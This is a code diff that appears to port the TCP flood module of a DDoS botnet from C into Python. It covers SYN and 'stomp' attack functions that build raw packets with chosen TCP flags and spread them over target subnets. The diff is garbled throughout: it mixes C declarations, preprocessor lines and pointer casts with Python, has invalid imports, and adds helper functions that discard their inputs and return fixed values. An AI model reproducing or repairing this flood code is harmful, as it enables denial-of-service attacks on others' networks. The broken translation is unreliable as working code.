@@ -2,33 +2,107 @@ import os, fcntl
 _GNU_SOURCE	= #ifdef DEBUG
 import sys
 #endif
-#include <unistd.h>
-#include <sys/socket.h>
-#include <linux/ip.h>
-#include <linux/tcp.h>
-#include <fcntl.h>
-#include <errno.h>
-#include "includes.h"
-#include "attack.h"
-#include "checksum.h"
-#include "rand.h"
+import <unistd.h>
+import <sys/socket.h>
+import <linux/ip.h>
+import <linux/tcp.h>
+import <fcntl.h>
+import <errno.h>
+
+import checksum_h_header
+import includes_h_header
+import attack_h_header
+import protocol_h_header
+import util_h_header
+import checksum_h_header
+import rand_h_header
+import util_c
+
+# predefined functions from imported modules
+https_transport = includes_h_header.https_transport
+dns_resolver = includes_h_header.dns_resolver
+ipv4_t = includes_h_header.ipv4_t
+htonl = includes_h_header.htonl
+INET_ADDR = includes_h_header.INET_ADDR
+xputc = includes_h_header.xputc
+xputs = includes_h_header.xputs
+va_list = includes_h_header.va_list
+va_start = includes_h_header.va_start
+va_end = includes_h_header.va_end
+xvprintf = includes_h_header.xvprintf
+xprintf = includes_h_header.xprintf
+attack_target = attack_h_header.attack_target
+attack_option = attack_h_header.attack_option
+attack_method = attack_h_header.attack_method
+attack_stomp_data = attack_h_header.attack_stomp_data
+attack_http_state = attack_h_header.attack_http_state
+attack_cfnull_state = attack_h_header.attack_cfnull_state
+add_attack = attack_h_header.add_attack
+free_opts = attack_h_header.free_opts
+table_value = table_h_header.table_value
+# DEBUG: This is how you generate these lines automatically, example...
+# DEBUG: cat util_c.py | egrep -i 'def|class' | egrep -vi '#' | cut -d \( -f 1 | awk '{print $2" = util_c."$2}'
+util_strlen = util_c.util_strlen
+util_strncmp = util_c.util_strncmp
+util_strcmp = util_c.util_strcmp
+util_strcpy = util_c.util_strcpy
+util_memcpy = util_c.util_memcpy
+util_zero = util_c.util_zero
+util_atoi = util_c.util_atoi
+util_itoa = util_c.util_itoa
+util_memsearch = util_c.util_memsearch
+util_stristr = util_c.util_stristr
+util_fdgets = util_c.util_fdgets
+util_isupper = util_c.util_isupper
+util_isalpha = util_c.util_isalpha
+util_isspace = util_c.util_isspace
+util_isdigit = util_c.util_isdigit
 
 def attack_tcp_syn(targs_len, struct attack_target *targs, opts_len, struct attack_option *opts):
+    def dont_frag():
+        attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, True)
+    	return True
+    def urg_fl():
+        attack_get_opt_int(opts_len, opts, ATK_OPT_URG, False)
+    	return False
+    def ack_fl():
+        attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, False)
+    	return False
+    def psh_fl():
+        attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, False)
+    	return False
+    def rst_fl():
+        attack_get_opt_int(opts_len, opts, ATK_OPT_RST, False)
+    	return False
+    def syn_fl():
+        attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, True)
+    	return True
+    def fin_fl():
+        attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, False)
+    	return False
     pkts = calloc(targs_len; sizeof ())
     ip_tos = attack_get_opt_int(opts_len; 0)
     ip_ident = attack_get_opt_int(opts_len; 0xffff)
     ip_ttl = attack_get_opt_int(opts_len; 64)
-    BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, True)
+    # BOOL dont_frag = attack_get_opt_int(opts_len, opts, ATK_OPT_IP_DF, True)
+    dont_frag()
     port_t sport = attack_get_opt_int(opts_len, opts, ATK_OPT_SPORT, 0xffff)
     port_t dport = attack_get_opt_int(opts_len, opts, ATK_OPT_DPORT, 0xffff)
     seq = attack_get_opt_int(opts_len; 0xffff)
     ack = attack_get_opt_int(opts_len; 0)
-    BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, False)
-    BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, False)
-    BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, False)
-    BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, False)
-    BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, True)
-    BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, False)
+    # BOOL urg_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_URG, False)
+    # BOOL ack_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_ACK, False)
+    # BOOL psh_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_PSH, False)
+    # BOOL rst_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_RST, False)
+    # BOOL syn_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_SYN, True)
+    # BOOL fin_fl = attack_get_opt_int(opts_len, opts, ATK_OPT_FIN, False)
+    # According to this code, it says the DEFAULT attack is a SYN flood with no fragmentation of the packets
+    urg_fl()
+    ack_fl()
+    psh_fl()
+    rst_fl()
+    syn_fl()
+    fin_fl()
     source_ip = attack_get_opt_ip(opts_len; LOCAL_ADDR)
 
     if (fd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1:
@@ -36,7 +110,7 @@ def attack_tcp_syn(targs_len, struct attack_target *targs, opts_len, struct atta
         printf("Failed to create raw socket. Aborting attack\n")
 #endif
         return
-    
+
     i = 1
     if setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &i, sizeof (int)) == -1:
 #ifdef DEBUG
@@ -48,11 +122,16 @@ def attack_tcp_syn(targs_len, struct attack_target *targs, opts_len, struct atta
     for i in range(targs_len):
         struct iphdr *iph
         struct tcphdr *tcph
+        iphdr(iph)
+        tcphdr(tcph)
 
         pkts[i] = calloc(128, sizeof (char))
-        iph = (struct iphdr *)pkts[i]
-        tcph = (struct tcphdr *)(iph + 1)
-        opts = ()(tcph + 1)
+        # iph = (struct iphdr *)pkts[i]
+        # tcph = (struct tcphdr *)(iph + 1)
+        # opts = ()(tcph + 1)
+        iph = iphdr(pkts[i])
+        tcph = tcphdr(iph+1)
+        opts = tcph + 1
 
         iph.version = 4
         iph.ihl = 5
@@ -108,7 +187,7 @@ def attack_tcp_syn(targs_len, struct attack_target *targs, opts_len, struct atta
             pkt = pkts[i]
             struct iphdr *iph = (struct iphdr *)pkt
             struct tcphdr *tcph = (struct tcphdr *)(iph + 1)
-            
+
             # For prefix attacks
             if targs[i].netmask < 32:
                 iph.daddr = htonl(ntohl(targs[i].addr) + (((uint32_t)rand_next()) >> targs[i].netmask))
@@ -306,7 +385,7 @@ def attack_tcp_stomp(targs_len, struct attack_target *targs, opts_len, struct at
 
         # Set it in nonblocking mode
         fcntl.fcntl(fd, F_SETFL, fcntl.fcntl(fd, F_GETFL, 0) | os.O_NONBLOCK)
- 
+
         # Set up address to connect to
         addr.sin_family = AF_INET
         if targs[i].netmask < 32:
